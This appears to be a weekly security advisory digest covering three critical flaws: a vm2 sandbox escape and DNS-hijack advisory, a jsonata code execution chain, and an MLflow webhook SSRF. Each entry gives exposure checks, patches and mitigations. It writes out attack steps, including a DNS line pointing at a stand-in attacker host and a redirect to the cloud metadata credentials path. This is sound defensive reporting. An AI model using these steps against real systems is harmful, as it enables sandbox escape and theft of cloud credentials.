Node.js sandboxing is the theme this week. vm2 — the go-to package for running untrusted JavaScript in isolation — got two critical patches in version 3.11.6: a full sandbox escape via prototype mutation chains, and a separate path that lets sandboxed code hijack your entire process's DNS resolver. If you evaluate user-supplied JSONata expressions, three companion ACE advisories (all published August 21) close a chaining exploit that gets code execution from a crafted query. On the Python side, MLflow's SSRF in webhook delivery is a clean, unauthenticated path to stealing AWS IAM credentials from the EC2 metadata service — immediate priority if you self-host MLflow on any cloud VM.

---

## CVE-2026-47698 — vm2 sandbox escape via prototype mutation bypass

CVE-2026-47698 | CVSS 9.8 | npm: vm2 ≤ 3.11.5 | Patched: 3.11.6

vm2 detected direct calls to dangerous prototype mutators but missed chained indirect invocations. An attacker calls the mutator as `indirectcall.call(indirectcall, dangerousMutator)`, bypasses the guard, gains a reference to the host `process` module via WebAssembly error objects, and runs arbitrary shell commands as the Node.js process user. A companion critical advisory, GHSA-m5w8-4gq2-6f8x (CVSS 9.3), is a separate but equally severe path: sandboxed code calls `require('dns').setServers(['attacker.example:53'])` to hijack every subsequent DNS lookup the host process makes — no sandbox escape required. Both are fixed in 3.11.6.

**Are you exposed?** You're exposed if user-supplied or third-party JavaScript runs inside a vm2 sandbox on version 3.11.5 or earlier. Common patterns: workflow automation platforms that let users write scripts, multi-tenant code runners, or low-code builders with custom logic execution. If all code entering vm2 is your own trusted source, practical risk is lower — but you're still on a vulnerable version.

**Fix** — `npm i vm2@3.11.6`. Both CVE-2026-47698 and GHSA-m5w8-4gq2-6f8x are resolved in this single release.

**If you can't patch** — Replace `builtin: ['*']` with an explicit allowlist that excludes `os` and `dns`. This closes the GHSA-m5w8-4gq2-6f8x DNS hijack path but does not block the prototype mutation escape in CVE-2026-47698.

## CVE-2026-77415 — jsonata arbitrary code execution via crafted expressions

CVE-2026-77415 | CVSS 9.3 | npm: jsonata 2.0.0–2.2.0 and < 1.8.8 | Patched: 2.2.1 / 1.8.8

Three weaknesses in jsonata — overridable `$clone`, destructurable lambda functions, and a custom `applyProcedure` forEach that bypasses the standard prototype method — can be chained to achieve code execution from a malicious JSONata query string. Attack complexity is rated Low; no authentication is required. Two companion CVEs (CVE-2026-77414, CVE-2026-77413) cover related vectors in the same release; 2.2.1 closes all three.

**Are you exposed?** You're exposed if your application accepts JSONata expression strings from users, API callers, or any external source and evaluates them with `jsonata(expr).evaluate(data)`. The typical vulnerable pattern: a rules engine, a data mapping UI, or a low-code workflow builder where users write JSONata to transform records. If all your JSONata expressions are hardcoded in your own source and never accept external input, you're not on the RCE path.

**Fix** — `npm i jsonata@2.2.1` (v2 branch) or `npm i jsonata@1.8.8` (v1 branch). The major version you're on matters — 1.x and 2.x have breaking API differences.

**If you can't patch** — Validate expression strings against a strict function allowlist before calling `evaluate()`. Any expression referencing `$clone`, lambda destructuring patterns, or non-whitelisted built-ins should be rejected.

## CVE-2026-64849 — MLflow SSRF exfiltrates AWS cloud credentials via webhook redirects

CVE-2026-64849 | CVSS 9.3 | pip: mlflow < 3.15.0 | Patched: 3.15.0

MLflow validates webhook URLs against private IP ranges on registration but doesn't re-validate after HTTP redirects or DNS rebinding. An attacker registers a webhook pointing to a public server (passes validation), configures that server to 302-redirect to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, then triggers delivery via `/api/2.0/mlflow/webhooks/{id}/test` — an endpoint that requires no authentication by default. The full response body, including temporary IAM access keys, is returned in the API response.

**Are you exposed?** You're exposed if you self-host MLflow (`mlflow server` or Docker image) on any cloud VM — AWS, GCP, or Azure — and the tracking server port is reachable by anyone outside your team. No authentication is needed to trigger the test endpoint; the only prerequisite is network reach. Localhost-only deployments or instances behind an auth proxy that gates all `/api/` paths before they hit MLflow are substantially safer.

**Fix** — `pip install --upgrade mlflow==3.15.0`. The patch adds `SSRFProtectedHTTPAdapter`, which validates the resolved peer IP after the TCP connection opens, blocking both redirect and DNS-rebinding paths.

**If you can't patch** — Block outbound connections from the MLflow process to 169.254.169.254 and RFC 1918 ranges at the security-group or iptables level. Also enforce authentication on the MLflow API via a reverse proxy in front of all `/api/` routes.
